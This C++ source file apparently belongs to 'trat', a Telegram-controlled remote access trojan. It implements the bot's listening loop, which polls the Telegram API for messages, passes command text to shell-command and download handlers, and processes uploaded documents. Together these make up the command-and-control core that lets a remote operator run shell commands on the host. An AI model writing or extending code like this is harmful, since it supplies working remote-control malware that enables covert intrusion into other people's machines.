/* trat/src/Bot/listen.cpp */
#include "../../include/bot.hpp"
#include <chrono>
#include <thread>
#include <future> // For async handling

namespace trat
{
  void Bot::listen()
  {
    int offset = -1;
    telebot_update_type_e update_types[] = {TELEBOT_UPDATE_TYPE_MESSAGE};
    telebot_error_e ret;    
    while (true)
    {
      telebot_update_t* updates = nullptr; // Dynamic array of updates 
      int count = 0; 
      ret = telebot_get_updates(handle, offset, 20, 0, update_types, 1, &updates, &count);
      if (ret != TELEBOT_ERROR_NONE)
      {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        continue;
      }

      for (int i = 0; i < count; ++i)
      {
        const auto& update = updates[i];
        if (update.update_type == TELEBOT_UPDATE_TYPE_MESSAGE)
        {
          const auto& message = update.message;
          auto message_text = message.text;
          auto message_document = message.document;

          if (this->checkIfCommand(message_text)) 
          {
            // Handle commands synchronously
            this->handleShellCommand(message_text);
            this->handleDownloadCommand(message_text);
          }
          else 
          {
            // Handle non-command message asynchronously, and capture the returned future
            auto future = std::async(std::launch::async, [this]()
            {
              this->sendMessage("This is not a valid command");
            });
            // You can handle the future if you need to, or simply discard it if you don't care about the result
            future.get(); // This ensures we consume the result and prevent the warning.
          }

          if (message_document)
          {
            // Handle document asynchronously, and capture the returned future
            auto future = std::async(std::launch::async, [this, message_document]()
            {
              this->handleDocuments(message_document);
            });
            // Consume the future result to avoid the warning
            future.get();
          }

          // Update the offset after processing
          offset = update.update_id + 1;

          // To prevent busy-waiting
          std::this_thread::sleep_for(std::chrono::milliseconds(1));
        }
      }

      // Clean up the updates array to avoid memory leaks
      telebot_put_updates(updates, count);
    }
  }
}
